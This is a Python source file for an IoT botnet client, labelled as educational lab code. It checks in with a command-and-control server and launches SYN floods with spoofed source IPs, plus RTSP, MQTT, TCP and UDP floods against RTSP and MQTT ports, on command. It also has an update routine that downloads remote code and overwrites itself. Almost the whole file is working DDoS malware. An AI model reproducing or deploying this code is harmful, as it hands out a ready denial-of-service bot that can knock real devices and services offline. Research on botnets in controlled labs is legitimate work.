#!/usr/bin/env python3
"""
IoT Security Research - Bot Client
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import subprocess
import time
import requests
import threading
import os
import signal
import sys
from datetime import datetime
import random
import json
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_client.log'),
        logging.StreamHandler()
    ]
)

class IoTBot:
    def __init__(self, cnc_server_ip, bot_id=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.bot_id = bot_id or self.get_local_ip()
        self.running = True
        self.attack_process = None
        self.attack_threads = []
        self.check_interval = 5  # Reduced check interval for faster response
        self.last_command_id = None
        
        # Set up signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        self.log("Bot initialized and ready")
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        self.log(f"Received shutdown signal ({signum})")
        self.running = False
        self.cleanup()
        sys.exit(0)
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            # Create a UDP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Connect to a local address in the IoT lab subnet (doesn't actually send any packets)
            s.connect(('11.10.10.1', 1))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            # Fallback to localhost if we can't determine IP
            return "127.0.0.1"
    
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[Bot {self.bot_id}] {message}")
    
    def checkin_with_cnc(self):
        """Check in with C&C server"""
        try:
            response = requests.post(
                f"{self.cnc_url}/bot-checkin",
                json={
                    "ip": self.bot_id,
                    "status": "active",
                    "last_command_id": self.last_command_id
                },
                timeout=5
            )
            return response.status_code == 200
        except Exception as e:
            self.log(f"Failed to check in with C&C: {e}")
            return False
    
    def get_command_from_cnc(self):
        """Get command from C&C server"""
        try:
            response = requests.get(
                f"{self.cnc_url}/get-command/{self.bot_id}",
                timeout=5
            )
            
            if response.status_code == 200:
                command_data = response.json()
                if command_data and command_data.get('command_id') != self.last_command_id:
                    self.last_command_id = command_data.get('command_id')
                    return command_data
            return None
            
        except Exception as e:
            self.log(f"Failed to get command: {e}")
            return None
    
    def check_tool_availability(self, tool):
        """Check if a tool is available in the system"""
        try:
            result = subprocess.run(
                [tool, "--help"], 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    def execute_ddos_attack(self, target, attack_type="syn", duration=60):
        """Execute DDoS attack with specified type and duration"""
        try:
            self.log(f"Starting {attack_type.upper()} attack against {target}")
            
            if attack_type.lower() == "syn":
                return self.execute_syn_flood(target)
            elif attack_type.lower() == "rtsp":
                return self.execute_rtsp_flood(target)
            elif attack_type.lower() == "mqtt":
                return self.execute_mqtt_flood(target)
            else:
                return self.execute_alternative_flood(target)
                
        except Exception as e:
            self.log(f"Failed to start attack: {e}")
            return False
    
    def execute_syn_flood(self, target):
        """Execute SYN flood attack using hping3"""
        try:
            if not self.check_tool_availability("hping3"):
                self.log("hping3 not available, using alternative flood method")
                return self.execute_alternative_flood(target)
            
            # IoT broker ports (RTSP and MQTT)
            target_ports = [554, 1883, 8883]  # RTSP, MQTT, MQTT over SSL
            
            for port in target_ports:
                cmd = [
                    "sudo", "hping3", 
                    "-S",              # SYN flood
                    "-p", str(port),   # Target port
                    "--flood",         # Flood mode
                    "--rand-source",   # Random source IPs
                    target
                ]
                
                self.log(f"Starting SYN flood attack against {target}:{port}")
                
                try:
                    process = subprocess.Popen(
                        cmd, 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL,
                        preexec_fn=os.setsid
                    )
                    self.attack_threads.append(process)
                    
                except Exception as e:
                    self.log(f"Failed to start hping3 on port {port}: {e}")
            
            if self.attack_threads:
                self.attack_process = True
                self.log(f"SYN flood attack started with {len(self.attack_threads)} processes")
                return True
            else:
                return self.execute_alternative_flood(target)
            
        except Exception as e:
            self.log(f"Failed to start SYN flood: {e}")
            return self.execute_alternative_flood(target)
    
    def execute_rtsp_flood(self, target):
        """Execute RTSP flood attack"""
        try:
            self.log(f"Starting RTSP flood attack against {target}")
            
            def rtsp_flood_worker():
                """Worker thread for RTSP flood"""
                rtsp_commands = [
                    "OPTIONS rtsp://{}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n",
                    "DESCRIBE rtsp://{}/ RTSP/1.0\r\nCSeq: 2\r\n\r\n",
                    "SETUP rtsp://{}/ RTSP/1.0\r\nCSeq: 3\r\n\r\n",
                    "PLAY rtsp://{}/ RTSP/1.0\r\nCSeq: 4\r\n\r\n"
                ]
                
                while self.running and self.attack_process:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        
                        # Connect to RTSP port
                        sock.connect((target, 554))
                        
                        # Send RTSP commands
                        for cmd in rtsp_commands:
                            if not self.running or not self.attack_process:
                                break
                            sock.send(cmd.format(target).encode())
                            time.sleep(random.uniform(0.001, 0.01))
                        
                        sock.close()
                        
                    except Exception:
                        pass  # Ignore errors and continue flooding
            
            # Start multiple RTSP flood threads
            for i in range(5):
                thread = threading.Thread(target=rtsp_flood_worker)
                thread.daemon = True
                thread.start()
                self.attack_threads.append(thread)
            
            self.attack_process = True
            self.log("RTSP flood attack started")
            return True
            
        except Exception as e:
            self.log(f"Failed to start RTSP flood: {e}")
            return False
    
    def execute_mqtt_flood(self, target):
        """Execute MQTT flood attack"""
        try:
            self.log(f"Starting MQTT flood attack against {target}")
            
            def mqtt_flood_worker():
                """Worker thread for MQTT flood"""
                while self.running and self.attack_process:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        
                        # Connect to MQTT port
                        sock.connect((target, 1883))
                        
                        # Send MQTT CONNECT packet
                        connect_packet = bytearray([
                            0x10,  # CONNECT packet type
                            0x0C,  # Remaining length
                            0x00, 0x04,  # Protocol name length
                            0x4D, 0x51, 0x54, 0x54,  # "MQTT"
                            0x04,  # Protocol version
                            0x02,  # Connect flags
                            0x00, 0x3C,  # Keep alive
                            0x00, 0x00   # Client ID length
                        ])
                        
                        sock.send(connect_packet)
                        time.sleep(random.uniform(0.001, 0.01))
                        sock.close()
                        
                    except Exception:
                        pass  # Ignore errors and continue flooding
            
            # Start multiple MQTT flood threads
            for i in range(5):
                thread = threading.Thread(target=mqtt_flood_worker)
                thread.daemon = True
                thread.start()
                self.attack_threads.append(thread)
            
            self.attack_process = True
            self.log("MQTT flood attack started")
            return True
            
        except Exception as e:
            self.log(f"Failed to start MQTT flood: {e}")
            return False
    
    def execute_alternative_flood(self, target):
        """Alternative flood method using Python sockets"""
        try:
            self.log(f"Starting alternative TCP flood attack against {target}")
            
            def tcp_flood_worker(target_port):
                """Worker thread for TCP flood on specific port"""
                while self.running and self.attack_process:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        
                        # Attempt to connect and immediately close
                        result = sock.connect_ex((target, target_port))
                        sock.close()
                        
                        # Small random delay to avoid being too predictable
                        time.sleep(random.uniform(0.001, 0.01))
                        
                    except Exception:
                        pass  # Ignore connection errors and continue flooding
            
            def udp_flood_worker():
                """Worker thread for UDP flood"""
                udp_ports = [554, 1883, 8883]  # RTSP, MQTT, MQTT over SSL
                
                while self.running and self.attack_process:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        
                        for port in udp_ports:
                            if not self.running or not self.attack_process:
                                break
                            
                            # Send random data
                            payload = os.urandom(random.randint(64, 1024))
                            sock.sendto(payload, (target, port))
                        
                        sock.close()
                        time.sleep(random.uniform(0.001, 0.005))
                        
                    except Exception:
                        pass
            
            # Start multiple TCP flood threads for different ports
            tcp_ports = [554, 1883, 8883]  # RTSP, MQTT, MQTT over SSL
            
            for port in tcp_ports:
                thread = threading.Thread(target=tcp_flood_worker, args=(port,))
                thread.daemon = True
                thread.start()
                self.attack_threads.append(thread)
            
            # Start UDP flood thread
            udp_thread = threading.Thread(target=udp_flood_worker)
            udp_thread.daemon = True
            udp_thread.start()
            self.attack_threads.append(udp_thread)
            
            self.attack_process = True
            self.log(f"Alternative flood attack started with {len(self.attack_threads)} threads")
            return True
            
        except Exception as e:
            self.log(f"Failed to start alternative flood: {e}")
            return False
    
    def stop_attack(self):
        """Stop all running attacks"""
        try:
            self.attack_process = False
            
            # Kill all attack threads
            for thread in self.attack_threads:
                if isinstance(thread, subprocess.Popen):
                    try:
                        os.killpg(os.getpgid(thread.pid), signal.SIGTERM)
                    except:
                        pass
                elif isinstance(thread, threading.Thread):
                    thread.join(timeout=1)
            
            self.attack_threads = []
            self.log("All attacks stopped")
            return True
            
        except Exception as e:
            self.log(f"Error stopping attacks: {e}")
            return False
    
    def execute_command(self, command_data):
        """Execute command received from C&C server"""
        try:
            command = command_data.get('command', '').lower()
            target = command_data.get('target', '')
            
            if command == 'start_ddos':
                attack_type = command_data.get('attack_type', 'syn')
                duration = command_data.get('duration', 60)
                return self.execute_ddos_attack(target, attack_type, duration)
                
            elif command == 'stop_ddos':
                return self.stop_attack()
                
            elif command == 'update':
                # Handle bot update command
                update_url = command_data.get('update_url')
                if update_url:
                    return self.update_bot(update_url)
                    
            else:
                self.log(f"Unknown command: {command}")
                return False
                
        except Exception as e:
            self.log(f"Error executing command: {e}")
            return False
    
    def update_bot(self, update_url):
        """Update bot with new version"""
        try:
            self.log(f"Updating bot from {update_url}")
            
            # Download new version
            response = requests.get(update_url, timeout=10)
            if response.status_code != 200:
                return False
            
            # Save new version
            with open(__file__, 'w') as f:
                f.write(response.text)
            
            self.log("Bot updated successfully")
            return True
            
        except Exception as e:
            self.log(f"Failed to update bot: {e}")
            return False
    
    def cleanup(self):
        """Clean up resources before shutdown"""
        self.stop_attack()
        self.log("Bot cleanup completed")
    
    def run(self):
        """Main bot loop"""
        self.log("Bot started")
        
        while self.running:
            try:
                # Check in with C&C server
                if not self.checkin_with_cnc():
                    time.sleep(self.check_interval)
                    continue
                
                # Get and execute commands
                command_data = self.get_command_from_cnc()
                if command_data:
                    self.execute_command(command_data)
                
                time.sleep(self.check_interval)
                
            except Exception as e:
                self.log(f"Error in main loop: {e}")
                time.sleep(self.check_interval)

def main():
    """Main entry point"""
    if len(sys.argv) != 2:
        print("Usage: python3 bot_client.py <c2_server_ip>")
        sys.exit(1)
    
    c2_server_ip = sys.argv[1]
    bot = IoTBot(c2_server_ip)
    
    try:
        bot.run()
    except KeyboardInterrupt:
        bot.cleanup()
        sys.exit(0)

if __name__ == "__main__":
    main() 